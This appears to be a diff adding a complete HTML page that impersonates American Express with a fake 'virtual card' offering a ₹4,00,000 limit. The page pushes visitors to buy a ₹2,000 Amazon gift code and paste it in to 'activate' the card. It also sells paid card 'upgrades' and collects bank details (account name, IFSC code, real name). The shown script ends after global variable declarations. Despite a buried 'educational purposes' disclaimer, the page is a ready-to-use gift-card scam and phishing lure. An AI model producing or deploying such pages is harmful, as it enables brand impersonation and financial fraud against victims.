@@ -1,0 +1,1439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>American Express Virtual Card Simulation</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts for Inter and Dancing Script -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Dancing+Script:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Basic reset for html and body to ensure full coverage */
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden; /* Prevent horizontal scrollbar */
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at top left, #1c2a38, #0a0a0a); /* Deeper, more subtle dark gradient for body */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            box-sizing: border-box;
+            color: #e0e0e0;
+        }
+        .container {
+            background: linear-gradient(145deg, #1a1a1a, #0a0a0a); /* Subtle gradient for container */
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 800px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 90vh;
+            padding: 20px; /* Added padding to container for content spacing */
+        }
+        /* The card-section itself will now have a consistent dark background */
+        .card-section {
+            background-color: #1a1a1a; /* Consistent dark background for the section */
+            padding: 24px;
+            border-bottom-left-radius: 16px;
+            border-bottom-right-radius: 16px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Welcome Section - Now fixed to cover the entire viewport */
+        .welcome-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            position: fixed; /* Position fixed to cover the entire viewport */
+            top: 0;
+            left: 0;
+            width: 100vw; /* Full viewport width */
+            height: 100vh; /* Full viewport height */
+            overflow: hidden; /* Keep overflow hidden for neon effects */
+            background: linear-gradient(145deg, #0a0a0a, #000000); /* Darker gradient for welcome section */
+            z-index: 999; /* Ensure it's on top of everything else initially */
+            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out; /* Smooth transition for hiding */
+        }
+
+        /* Class to hide the welcome section with a fade effect */
+        .welcome-section.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none; /* Disable interactions when hidden */
+        }
+
+        .neon-glow-effect {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .neon-line {
+            position: absolute;
+            background: linear-gradient(to right, transparent, #00FFFF, transparent);
+            height: 2px;
+            animation: moveLine 8s infinite linear;
+            opacity: 0.7;
+            filter: blur(1px);
+        }
+
+        .neon-line:nth-child(1) { top: 10%; left: -100%; width: 150%; animation-delay: 0s; }
+        .neon-line:nth-child(2) { top: 30%; left: -120%; width: 130%; animation-delay: 2s; background: linear-gradient(to left, transparent, #FF00FF, transparent); }
+        .neon-line:nth-child(3) { top: 50%; left: -80%; width: 140%; animation-delay: 4s; background: linear-gradient(to right, transparent, #FFFF00, transparent); }
+        .neon-line:nth-child(4) { top: 70%; left: -150%; width: 160%; animation-delay: 6s; background: linear-gradient(to left, transparent, #00FF00, transparent); }
+
+        @keyframes moveLine {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(200%); }
+        }
+
+        .welcome-text-main {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 1rem;
+            max-width: 90%;
+            word-wrap: break-word;
+            z-index: 1;
+            position: relative;
+            text-shadow: 0 0 10px #00FFFF, 0 0 20px #00FFFF;
+            line-height: 1.2; /* Adjust line height for multi-line text */
+        }
+
+        @media (max-width: 640px) {
+            .welcome-text-main {
+                font-size: 1.8rem;
+            }
+        }
+
+        .card-container-wrapper {
+            display: flex;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .card-container {
+            perspective: 1000px;
+            width: 320px; /* Smaller width for realism */
+            height: 200px; /* Adjusted height for realism */
+            margin: 0 auto;
+        }
+
+        .credit-card {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.8s;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            cursor: pointer;
+        }
+
+        .credit-card.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+            color: #fff;
+            box-sizing: border-box;
+            transition: background 0.8s ease-in-out; /* Apply transition here for all backgrounds */
+        }
+
+        /* Card Colors - Applied to #cardFrontFace with specific classes */
+        #cardFrontFace.default-card {
+            background: linear-gradient(135deg, #0056b3, #0078FF); /* Default AMEX blue */
+        }
+        #cardFrontFace.silver-card {
+            background: linear-gradient(135deg, #A8A8A8, #707070);
+        }
+        #cardFrontFace.golden-card {
+            background: linear-gradient(135deg, #FFD700, #DAA520);
+        }
+        #cardFrontFace.black-premium-card {
+            background: linear-gradient(135deg, #333333, #000000);
+        }
+
+        .card-back {
+            background-color: #1a1a1a; /* Black background for card back */
+            transform: rotateY(180deg);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .amex-logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            align-self: flex-end;
+            margin-top: -10px;
+            letter-spacing: -2px;
+            color: #f0f0f0;
+            display: flex;
+            align-items: center;
+            gap: 5px; /* Space between AMEX text and custom logo */
+        }
+        .amex-logo.silver-logo .card-type-logo { color: #C0C0C0; }
+        .amex-logo.golden-logo .card-type-logo { color: #FFD700; }
+        .amex-logo.black-premium-logo .card-type-logo { color: #A9A9A9; }
+
+        .card-type-logo {
+            font-size: 1.5rem; /* Size for the specific card type icon */
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+
+
+        .card-number {
+            font-size: 1.5rem;
+            letter-spacing: 3px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+
+        .card-details-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            font-size: 0.9rem;
+        }
+
+        .card-holder-name {
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .signature-line {
+            height: 40px;
+            background-color: #555;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 0.8rem;
+            font-style: italic;
+            border-radius: 4px;
+            position: relative;
+        }
+        .digital-signature {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.2rem;
+            color: #fff;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            opacity: 0.9;
+        }
+
+        .cvv-strip {
+            height: 50px;
+            background-color: #000;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 15px;
+            border-radius: 4px;
+        }
+        .cvv-number {
+            background-color: #fff;
+            color: #000;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        .cvv-hidden {
+            color: transparent;
+            text-shadow: 0 0 8px rgba(255,255,255,0.5);
+        }
+
+        .neon-text {
+            color: #00FFFF;
+            text-shadow: 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 40px #00FFFF;
+            animation: neon-fade 2s infinite alternate;
+        }
+
+        @keyframes neon-fade {
+            from { opacity: 1; }
+            to { opacity: 0.4; }
+        }
+
+        /* Small loading spinner for buttons */
+        .button-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block; /* Keep it inline with text if needed */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .main-content {
+            padding: 24px;
+            flex-grow: 1;
+            background: linear-gradient(145deg, #1a1a1a, #0a0a0a); /* Consistent with container */
+            color: #e0e0e0;
+        }
+
+        .section-container {
+            display: none;
+        }
+        .section-container.active {
+            display: block;
+        }
+
+        .success-tick {
+            font-size: 3rem;
+            color: #28a745;
+            animation: pop-in 0.5s ease-out;
+        }
+
+        @keyframes pop-in {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
+        }
+        .modal.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-content {
+            background-color: #2a2a2a;
+            color: #e0e0e0;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+        }
+        .modal-close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #888;
+        }
+
+        .highlight {
+            color: #00FFFF;
+            font-weight: 600;
+            text-shadow: 0 0 5px #00FFFF;
+        }
+
+        .payment-progress-bar {
+            width: 0%;
+            height: 8px;
+            background-color: #00FFFF;
+            border-radius: 4px;
+            margin-top: 10px;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .balance-pulse {
+            animation: pulse 0.5s ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 640px) {
+            .card-number {
+                font-size: 1.2rem;
+                letter-spacing: 2px;
+            }
+            .amex-logo {
+                font-size: 2rem;
+            }
+            .card-details-row {
+                font-size: 0.8rem;
+            }
+            .container {
+                padding: 10px;
+            }
+            .card-section, .main-content {
+                padding: 16px;
+            }
+            .welcome-text-main {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-900">
+    <!-- Welcome Section (Initial View) - Moved outside the container for full screen coverage -->
+    <div id="welcomeSection" class="welcome-section">
+        <div class="neon-glow-effect">
+            <div class="neon-line"></div>
+            <div class="neon-line"></div>
+            <div class="neon-line"></div>
+            <div class="neon-line"></div>
+        </div>
+        <h1 class="welcome-text-main">Welcome to American <br> Express.com</h1>
+        <p id="virtualCardText" class="text-xl text-center font-medium mb-8 neon-text z-10 relative">Choose your virtual card</p>
+        <div id="getCardButtonContainer" class="text-center z-10 relative">
+            <button id="getCardBtn" class="bg-blue-600 text-white px-8 py-3 rounded-full text-lg font-semibold shadow-lg hover:bg-blue-700 transition-all duration-300 transform hover:scale-105">Get Card</button>
+        </div>
+    </div>
+
+    <div class="container rounded-xl flex flex-col min-h-[90vh] hidden"> <!-- Added 'hidden' to container initially -->
+        <!-- Card Section - Always at the top after "Get Card" is clicked -->
+        <div id="cardSection" class="card-section rounded-b-xl">
+            <h1 class="text-white text-3xl font-bold mb-4 text-center">Your American Express Virtual Card</h1>
+            <div id="virtualCardDisplay" class="fade-in">
+                <div class="card-container-wrapper">
+                    <div class="card-container">
+                        <div id="creditCard" class="credit-card">
+                            <!-- Card Front -->
+                            <div id="cardFrontFace" class="card-face">
+                                <div class="flex justify-between items-start">
+                                    <!-- Realistic Chip SVG -->
+                                    <svg class="w-16 h-10" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <rect x="3" y="5" width="18" height="14" rx="3" fill="#FFD700" stroke="#B8860B" stroke-width="1.5"/>
+                                        <path d="M7 9H17V15H7V9Z" fill="#B8860B"/>
+                                        <rect x="9" y="11" width="6" height="2" rx="0.5" fill="#FFD700"/>
+                                        <rect x="9" y="13.5" width="6" height="0.5" rx="0.25" fill="#FFD700"/>
+                                        <path d="M7 9C7 7.89543 7.89543 7 9 7H15C16.1046 7 17 7.89543 17 9V15C17 16.1046 16.1046 17 15 17H9C7.89543 17 7 16.1046 7 15V9Z" stroke="#B8860B" stroke-width="1.5"/>
+                                    </svg>
+                                    <span id="amexLogo" class="amex-logo">AMEX <span id="cardTypeLogo" class="card-type-logo"></span></span>
+                                </div>
+                                <div class="card-number" id="cardNumber">XXXX XXXX XXXX XXXX</div>
+                                <div class="card-details-row">
+                                    <div class="flex flex-col">
+                                        <span class="text-xs opacity-80">VALID THRU</span>
+                                        <span id="cardExpiry" class="font-bold">MM/YY</span>
+                                    </div>
+                                    <div class="flex flex-col text-right">
+                                        <span class="text-xs opacity-80">CARDHOLDER NAME</span>
+                                        <span id="cardName" class="card-holder-name">YOUR NAME</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Card Back -->
+                            <div id="cardBackFace" class="card-face card-back">
+                                <div class="cvv-strip">
+                                    <span id="cardCvvDisplayBack" class="cvv-number cvv-hidden">XXX</span>
+                                </div>
+                                <div class="signature-line">
+                                    <span class="digital-signature">A. Express</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="text-center text-white text-sm mt-2">Click on the card to flip!</div>
+                <div class="text-center text-white text-sm mt-1">Click CVV on back to reveal!</div>
+            </div>
+        </div>
+
+        <!-- Main Content Section -->
+        <div class="main-content flex-grow p-6">
+            <p id="cardBenefitMsg" class="text-center text-gray-300 text-md mb-6 hidden fade-in highlight">
+                You can spend upto <span class="text-green-400">₹4,00,000</span> rupees per month by just giving a small <span class="text-green-400">₹5,000</span> rupees per month. You are very lucky to get the most demanding American Express credit card.
+            </p>
+
+            <div id="mainOptions" class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-8 hidden">
+                <button id="useCardBtn" class="bg-blue-600 text-white px-6 py-4 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300 transform hover:scale-105 text-lg font-semibold">Use Card</button>
+                <button id="cardDetailsBtn" class="bg-blue-600 text-white px-6 py-4 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300 transform hover:scale-105 text-lg font-semibold">Card Details</button>
+                <button id="purchaseBenefitCardBtn" class="bg-blue-600 text-white px-6 py-4 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300 transform hover:scale-105 text-lg font-semibold">Purchase a Benefit Card</button>
+                <button id="activateExternalBtn" class="bg-blue-600 text-white px-6 py-4 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300 transform hover:scale-105 text-lg font-semibold">Activate Card for External Use</button>
+            </div>
+
+            <!-- Section Containers -->
+            <div id="useCardSection" class="section-container mt-8 p-6 bg-gray-800 rounded-lg shadow-inner">
+                <h3 class="text-2xl font-semibold text-white mb-4">Use Your Virtual Card</h3>
+                <p class="text-gray-400 mb-6">Use your virtual card to purchase the subscription and test the payment.</p>
+                <div class="grid grid-cols-2 gap-4">
+                    <button class="app-button bg-red-700 text-white p-4 rounded-lg flex flex-col items-center justify-center shadow-md hover:bg-red-800 transition-all duration-300" data-app="netflix" data-cost="0">
+                        <!-- Netflix Logo SVG -->
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17.47 16.47L15.93 17.91L14.39 16.47L15.93 14.93L17.47 16.47Z" fill="#E50914"/>
+                            <path d="M12.0001 2.00001C6.47715 2.00001 2 6.47715 2 12.0001C2 17.523 6.47715 22 12.0001 22C17.523 22 22 17.523 22 12.0001C22 6.47715 17.523 2.00001 12.0001 2.00001ZM12.0001 19.96C7.58157 19.96 4.04001 16.4184 4.04001 12.0001C4.04001 7.58157 7.58157 4.04001 12.0001 4.04001C16.4184 4.04001 19.96 7.58157 19.96 12.0001C19.96 16.4184 16.4184 19.96 12.0001 19.96Z" fill="#E50914"/>
+                            <path d="M12.0001 12.0001L14.0001 14.0001L12.00001 16.0001L10.0001 14.0001L12.0001 12.0001Z" fill="#E50914"/>
+                            <path d="M12.0001 7.00001L14.0001 9.00001L12.00001 11.0001L10.0001 9.00001L12.0001 7.00001Z" fill="#E50914"/>
+                        </svg>
+                        <span>Netflix</span>
+                    </button>
+                    <button class="app-button bg-blue-700 text-white p-4 rounded-lg flex flex-col items-center justify-center shadow-md opacity-60 cursor-not-allowed" data-app="amazon-prime" data-cost="700" disabled>
+                        <i class="fab fa-amazon text-4xl mb-2"></i>
+                        <span>Amazon Prime (Locked)</span>
+                    </button>
+                    <button class="app-button bg-yellow-700 text-white p-4 rounded-lg flex flex-col items-center justify-center shadow-md opacity-60 cursor-not-allowed" data-app="flipkart" disabled>
+                        <i class="fas fa-shopping-bag text-4xl mb-2"></i>
+                        <span>Flipkart (Locked)</span>
+                    </button>
+                    <button class="app-button bg-red-800 text-white p-4 rounded-lg flex flex-col items-center justify-center shadow-md opacity-60 cursor-not-allowed" data-app="zomato" disabled>
+                        <i class="fas fa-utensils text-4xl mb-2"></i>
+                        <span>Zomato (Locked)</span>
+                    </button>
+                </div>
+                <p class="text-sm text-gray-500 mt-4 text-center">Upgrade the card fully to access all apps and external use of card.</p>
+                <button class="back-btn mt-6 bg-gray-700 text-white px-6 py-2 rounded-full hover:bg-gray-600 transition-all duration-300">Back</button>
+            </div>
+
+            <!-- Netflix Plan Selection Modal (hidden by default) -->
+            <div id="netflixPlanModal" class="modal">
+                <div class="modal-content bg-gray-800">
+                    <span class="modal-close-btn" id="closeNetflixModalBtn">&times;</span>
+                    <h3 class="text-2xl font-semibold text-white mb-4">Choose Netflix Plan</h3>
+                    <div class="grid grid-cols-1 gap-4">
+                        <div class="plan-option bg-gray-700 p-4 rounded-lg cursor-pointer hover:bg-gray-600 transition-colors" data-plan-cost="199" data-plan-name="Basic (480p)">
+                            <p class="font-semibold text-white">Basic Plan</p>
+                            <p class="text-gray-300 text-sm">₹199 / month - 480p Quality</p>
+                        </div>
+                        <div class="plan-option bg-gray-700 p-4 rounded-lg cursor-pointer hover:bg-gray-600 transition-colors" data-plan-cost="499" data-plan-name="Standard (720p)">
+                            <p class="font-semibold text-white">Standard Plan</p>
+                            <p class="text-gray-300 text-sm">₹499 / month - 720p Quality</p>
+                        </div>
+                        <div class="plan-option bg-gray-700 p-4 rounded-lg cursor-pointer hover:bg-gray-600 transition-colors" data-plan-cost="649" data-plan-name="Premium (1080p & 4K)">
+                            <p class="font-semibold text-white">Premium Plan</p>
+                            <p class="text-gray-300 text-sm">₹649 / month - 1080p & 4K Quality</p>
+                        </div>
+                    </div>
+                    <button id="confirmNetflixPlanBtn" class="bg-blue-600 text-white px-6 py-2 rounded-full mt-6 hover:bg-blue-700 transition-all duration-300 hidden">Confirm Plan</button>
+                </div>
+            </div>
+
+
+            <div id="cardDetailsSection" class="section-container mt-8 p-6 bg-gray-800 rounded-lg shadow-inner">
+                <h3 class="text-2xl font-semibold text-white mb-4">Card Details</h3>
+                <div class="bg-gray-700 p-4 rounded-lg shadow-md mb-6">
+                    <p class="text-gray-300 mb-2"><span class="font-semibold">Card Number:</span> <span id="displayCardNumber"></span> <button class="copy-btn text-blue-400 hover:text-blue-200 ml-2 text-sm" data-target="displayCardNumber">Copy</button></p>
+                    <p class="text-gray-300 mb-2"><span class="font-semibold">CVV:</span> <span id="displayCardCvv"></span> <button class="copy-btn text-blue-400 hover:text-blue-200 ml-2 text-sm" data-target="displayCardCvv">Copy</button></p>
+                    <p class="text-gray-300"><span class="font-semibold">Expiry Date:</span> <span id="displayCardExpiry"></span> <button class="copy-btn text-blue-400 hover:text-blue-200 ml-2 text-sm" data-target="displayCardExpiry">Copy</button></p>
+                </div>
+
+                <button id="checkBalanceBtn" class="bg-green-600 text-white px-6 py-3 rounded-xl shadow-md hover:bg-green-700 transition-all duration-300">Check Card Balance</button>
+                <div id="balanceDisplay" class="hidden mt-4 bg-blue-900 p-4 rounded-lg text-blue-200 font-semibold fade-in">
+                    <p>Current Balance: <span id="currentBalance">₹400000</span></p>
+                    <p>Installment per month: <span id="installmentAmount">₹5000</span></p>
+                </div>
+
+                <h4 class="text-xl font-semibold text-white mt-8 mb-4">Add UPI/Bank Details</h4>
+                <div class="bg-gray-700 p-4 rounded-lg shadow-md mb-6">
+                    <div class="mb-4">
+                        <label for="holderName" class="block text-gray-300 text-sm font-bold mb-2">Account Holder Name:</label>
+                        <input type="text" id="holderName" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-900 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" placeholder="John Doe">
+                    </div>
+                    <div class="mb-4">
+                        <label for="ifscCode" class="block text-gray-300 text-sm font-bold mb-2">IFSC Code:</label>
+                        <input type="text" id="ifscCode" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-900 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" placeholder="SBIN0000001">
+                    </div>
+                    <div class="mb-4">
+                        <label for="realName" class="block text-gray-300 text-sm font-bold mb-2">Real Name (for verification):</label>
+                        <input type="text" id="realName" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-900 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" placeholder="Your Full Name">
+                    </div>
+                    <button id="saveBankDetailsBtn" class="bg-blue-600 text-white px-6 py-2 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300">Save Details</button>
+                </div>
+
+                <h4 class="text-xl font-semibold text-white mt-8 mb-4 highlight">Transaction History</h4>
+                <div id="transactionHistory" class="bg-gray-700 p-4 rounded-lg shadow-md mb-6 max-h-60 overflow-y-auto">
+                    <p class="text-gray-500 text-center">No transactions yet.</p>
+                </div>
+
+                <h4 class="text-xl font-semibold text-white mt-8 mb-4 highlight">Precautions for Banking and Credit Card Use</h4>
+                <ul class="list-disc list-inside text-gray-300 bg-yellow-900 p-4 rounded-lg shadow-inner">
+                    <li>Always protect your card details and PIN.</li>
+                    <li>Be wary of phishing attempts and suspicious links.</li>
+                    <li>Review your statements regularly for unauthorized transactions.</li>
+                    <li>Report lost or stolen cards immediately.</li>
+                    <li>Use strong, unique passwords for online banking.</li>
+                </ul>
+                <button class="back-btn mt-6 bg-gray-700 text-white px-6 py-2 rounded-full hover:bg-gray-600 transition-all duration-300">Back</button>
+            </div>
+
+            <div id="purchaseBenefitCardSection" class="section-container mt-8 p-6 bg-gray-800 rounded-lg shadow-inner">
+                <h3 class="text-2xl font-semibold text-white mb-4">Purchase a Benefit Card</h3>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <!-- Silver Card -->
+                    <div class="card-option bg-gray-700 p-6 rounded-xl shadow-md text-center border-2 border-gray-600 hover:border-blue-500 transition-all duration-300" data-card="silver" data-cost="10000" data-limit="700000">
+                        <h4 class="text-xl font-bold text-gray-300 mb-2">Silver Card</h4>
+                        <p class="text-gray-400 mb-4">Limit Increase: ₹7,00,000</p>
+                        <ul class="list-disc list-inside text-sm text-gray-400 text-left mb-4">
+                            <li>Enhanced Rewards</li>
+                            <li>Priority Customer Support</li>
+                            <li>Exclusive Discounts</li>
+                        </ul>
+                        <button class="purchase-card-btn bg-blue-500 text-white px-6 py-2 rounded-full hover:bg-blue-600 transition-all duration-300">Purchase (₹10,000)</button>
+                    </div>
+
+                    <!-- Golden Card -->
+                    <div class="card-option bg-yellow-900 p-6 rounded-xl shadow-md text-center border-2 border-yellow-700 hover:border-blue-500 transition-all duration-300" data-card="golden" data-cost="25000" data-limit="1200000">
+                        <h4 class="text-xl font-bold text-yellow-300 mb-2">Golden Card</h4>
+                        <p class="text-yellow-400 mb-4">Limit Increase: ₹12,00,000</p>
+                        <ul class="list-disc list-inside text-sm text-yellow-400 text-left mb-4">
+                            <li>All Silver benefits</li>
+                            <li>Travel Insurance</li>
+                            <li>Airport Lounge Access</li>
+                            <li>Lower Installments</li>
+                        </ul>
+                        <button class="purchase-card-btn bg-blue-500 text-white px-6 py-2 rounded-full hover:bg-blue-600 transition-all duration-300">Purchase (₹25,000)</button>
+                    </div>
+
+                    <!-- Black Premium Card -->
+                    <div class="card-option bg-black p-6 rounded-xl shadow-md text-center border-2 border-gray-700 hover:border-blue-500 transition-all duration-300" data-card="black-premium" data-cost="50000" data-limit="2500000">
+                        <h4 class="text-xl font-bold text-white mb-2">Black Premium Card</h4>
+                        <p class="text-gray-300 mb-4">Limit Increase: ₹25,00,000</p>
+                        <ul class="list-disc list-inside text-sm text-gray-300 text-left mb-4">
+                            <li>All Golden benefits</li>
+                            <li>Concierge Service</li>
+                            <li>Exclusive Global Access</li>
+                            <li>Significantly Lower Installments</li>
+                        </ul>
+                        <button class="purchase-card-btn bg-blue-500 text-white px-6 py-2 rounded-full hover:bg-blue-600 transition-all duration-300">Purchase (₹50,000)</button>
+                    </div>
+                </div>
+                <button class="back-btn mt-6 bg-gray-700 text-white px-6 py-2 rounded-full hover:bg-gray-600 transition-all duration-300">Back</button>
+            </div>
+
+            <div id="activateExternalSection" class="section-container mt-8 p-6 bg-gray-800 rounded-lg shadow-inner">
+                <h3 class="text-2xl font-semibold text-white mb-4">Activate Card for External Use</h3>
+                <div id="activationMessage" class="bg-yellow-900 text-yellow-200 p-4 rounded-lg mb-4 hidden fade-in">
+                    <p class="font-semibold">Your Netflix subscription is on hold. It will be activated in <span id="countdown24hr" class="highlight">24:00:00</span>.</p>
+                    <p class="text-sm mt-1">Note: Activate the card fully or else the subscription might get cancelled.</p>
+                </div>
+
+                <p class="text-gray-300 mb-4 highlight">
+                    American Express credit card has an alliance with amazon.com to activate the card.
+                    <br>
+                    <span class="font-bold text-lg">Steps:</span>
+                    <ol class="list-decimal list-inside ml-4 mt-2 text-gray-400">
+                        <li>Purchase an Amazon gift code of worth <span class="text-green-400">₹2,000</span>.</li>
+                        <li>Paste the gift code in the section below.</li>
+                        <li>Click 'Activate Card for External Use'.</li>
+                    </ol>
+                </p>
+                <p class="text-red-400 font-bold text-lg mb-4 text-center">
+                    ⚠️ Do not use the gift code before reviewing, it may fail the activation of the card.
+                </p>
+
+                <div class="mb-4">
+                    <label for="giftCode" class="block text-gray-300 text-sm font-bold mb-2">Paste Gift Code:</label>
+                    <input type="text" id="giftCode" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-900 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" placeholder="Enter Amazon Gift Code">
+                </div>
+                <button id="activateExternalUseBtn" class="bg-blue-600 text-white px-6 py-3 rounded-xl shadow-md hover:bg-blue-700 transition-all duration-300">Activate Card for External Use</button>
+
+                <!-- Modified Review Message and Countdown Structure -->
+                <div id="reviewMessageContainer" class="text-center mt-4 hidden">
+                    <p id="reviewTextMessage" class="text-lg text-gray-300">
+                        Wait for our team to review the code. Activation will be completed in:
+                    </p>
+                    <span id="countdown30min" class="text-3xl neon-text block mt-2">30:00</span>
+                </div>
+
+                <div id="fullActivationBenefits" class="hidden mt-6 bg-green-900 text-green-200 p-4 rounded-lg fade-in">
+                    <p class="font-semibold text-lg mb-2">Card Fully Activated!</p>
+                    <p>You can now do shopping, do card transactions, and spend money whenever and wherever you want!</p>
+                </div>
+
+                <button class="back-btn mt-6 bg-gray-700 text-white px-6 py-2 rounded-full hover:bg-gray-600 transition-all duration-300">Back</button>
+            </div>
+
+            <!-- Global Loading Overlay -->
+            <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+                <div class="flex flex-col items-center text-white">
+                    <div class="loading-spinner"></div>
+                    <p class="mt-4 text-lg" id="loadingText">Loading...</p>
+                </div>
+            </div>
+
+            <!-- Global Message Modal (for success/failure) -->
+            <div id="messageModal" class="modal">
+                <div class="modal-content">
+                    <span class="modal-close-btn" id="closeModalBtn">&times;</span>
+                    <div id="modalContent"></div>
+                </div>
+            </div>
+
+            <!-- Global Payment Processing Modal -->
+            <div id="paymentProcessingModal" class="modal">
+                <div class="modal-content bg-gray-900">
+                    <h3 class="text-xl font-semibold text-white mb-4" id="paymentModalTitle">Processing Payment...</h3>
+                    <div class="flex flex-col items-center">
+                        <div class="loading-spinner mb-4"></div>
+                        <p class="text-gray-400 mb-2" id="paymentStatusText">Initiating transaction...</p>
+                        <div class="w-full bg-gray-700 rounded-full h-2.5 mb-4">
+                            <div class="payment-progress-bar" id="paymentProgressBar"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Global Warning Modal -->
+            <div id="warningModal" class="modal">
+                <div class="modal-content bg-red-900 border-l-4 border-red-500 text-red-200 p-4" role="alert">
+                    <span class="modal-close-btn" id="closeWarningModalBtn">&times;</span>
+                    <p class="font-bold text-xl mb-2">Important Warning!</p>
+                    <p>This website is for test and educational purposes only. Do NOT use it for real-life transactions or share any personal financial information.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // Global State Variables
+        let currentBalance = 400000; // Default initial balance
+        let monthlyInstallment = 5000;
+        let cardType = 'default'; // 'default', 'silver', 'golden', 'black-premium'
+        let isCardFlipped = false;
+        let isCvvVisible = false; // New state for CVV visibility
+        let transactions = [];
+        let isNetflixSubscribed = false;
+        let isAmazonPrimeSubscribed = false;
